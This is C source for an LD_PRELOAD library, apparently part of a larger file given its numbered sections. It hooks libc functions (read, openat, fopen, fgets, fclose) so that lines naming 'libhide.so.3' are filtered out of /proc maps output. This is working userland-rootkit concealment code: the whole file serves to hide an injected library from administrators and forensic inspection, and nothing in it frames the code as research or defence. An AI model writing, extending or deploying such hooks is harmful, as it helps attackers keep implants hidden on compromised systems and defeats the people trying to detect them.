#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <limits.h>

/* --- Configuration --- */

#define LIB_TO_HIDE "libhide.so.3"

/* Global to track if the current opened file is a maps file */
static FILE *proc_maps_fp = NULL;

/* --- 4. read hook: memory map filtering --- */
ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*orig_read)(int, void *, size_t) = NULL;
    if (!orig_read) orig_read = dlsym(RTLD_NEXT, "read");

    ssize_t n = orig_read(fd, buf, count);
    if (n <= 0) return n;

    /* Check if fd points to a maps file via /proc/self/fd */
    char fd_path[PATH_MAX], real_path[PATH_MAX];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(fd_path, real_path, sizeof(real_path) - 1);
    if (len <= 0) return n;

    real_path[len] = '\0';
    if (!strstr(real_path, "/maps"))
        return n;

    /* Scan buffer line-by-line and remove lines containing LIB_TO_HIDE */
    char *start = (char *)buf;
    char *end;
    while ((end = memchr(start, '\n', (char *)buf + n - start)) != NULL) {
        if (memmem(start, end - start + 1, LIB_TO_HIDE, strlen(LIB_TO_HIDE))) {
            size_t line_len = end - start + 1;
            memmove(start, end + 1, (char *)buf + n - (end + 1));
            n -= line_len;
        } else {
            start = end + 1;
        }
    }
    return n;
}

/* --- openat hook (currently just a passthrough) --- */
int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*orig_openat)(int, const char *, int, mode_t) = NULL;
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    /* No special handling yet: just forward to real openat */
    return orig_openat(dirfd, pathname, flags, mode);
}

/* --- 5. Memory Map Hiding (fopen/fgets/fclose) --- */
FILE *fopen(const char *pathname, const char *mode) {
    static FILE *(*orig_fopen)(const char *, const char *) = NULL;
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");

    FILE *fp = orig_fopen(pathname, mode);

    /* Track maps file handle for fgets/fclose */
    if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/maps"))
        proc_maps_fp = fp;

    return fp;
}

char *fgets(char *s, int size, FILE *stream) {
    static char *(*orig_fgets)(char *, int, FILE *) = NULL;
    if (!orig_fgets) orig_fgets = dlsym(RTLD_NEXT, "fgets");

    char *result;
    while ((result = orig_fgets(s, size, stream)) != NULL) {
        if (stream == proc_maps_fp && strstr(s, LIB_TO_HIDE))
            continue;  /* skip this line */
        break;
    }
    return result;
}

int fclose(FILE *stream) {
    static int (*orig_fclose)(FILE *) = NULL;
    if (!orig_fclose) orig_fclose = dlsym(RTLD_NEXT, "fclose");

    if (stream == proc_maps_fp)
        proc_maps_fp = NULL;

    return orig_fclose(stream);
}
